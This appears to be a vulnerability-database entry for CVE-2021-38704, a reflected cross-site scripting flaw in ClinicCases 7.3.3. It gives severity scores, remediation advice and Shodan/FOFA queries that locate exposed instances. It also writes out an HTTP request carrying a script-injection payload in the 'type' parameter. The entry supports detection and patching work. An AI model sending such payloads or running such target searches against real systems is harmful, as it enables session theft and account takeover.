---
layout: post
cve_id: CVE-2021-38704
title: ClinicCases 7.3.3 Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-38704.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-38704.yaml
snort2_rule: N/A
snort3_rule: N/A
author: alph4byt3
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute malicious scripts in the context of the victim''s browser, leading to potential
  data theft, session hijacking, or defacement of the affected website.

  '
remediation: 'To mitigate this vulnerability, it is recommended to implement proper
  input validation and sanitization techniques to prevent the execution of malicious
  scripts.

  '
reference:
- https://github.com/sudonoodle/CVE-2021-38704
- https://nvd.nist.gov/vuln/detail/CVE-2021-38704
- https://github.com/judsonmitchell/ClinicCases/releases
- https://github.com/ARPSyndicate/cvemon
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2021-38704
  cwe-id: CWE-79
  epss-score: 0.09961
  epss-percentile: 0.92805
  cpe: cpe:2.3:a:cliniccases:cliniccases:7.3.3:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: cliniccases
  product: cliniccases
  shodan-query:
  - http.title:"ClinicCases",html:"/cliniccases/"
  - http.title:"cliniccases",html:"/cliniccases/"
  fofa-query: title="cliniccases",html:"/cliniccases/"
  google-query: intitle:"cliniccases",html:"/cliniccases/"
tags:
- cve
- cve2021
- xss
- cliniccases
- vuln
---

## üîç Vulnerability Description
ClinicCases 7.3.3 is susceptible to multiple reflected cross-site scripting vulnerabilities that could allow unauthenticated attackers to introduce arbitrary JavaScript by crafting a malicious URL. This can result in account takeover via session token theft.

## üåê HTTP Request
```nohighlight
GET /cliniccases/lib/php/data/messages_load.php?type=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

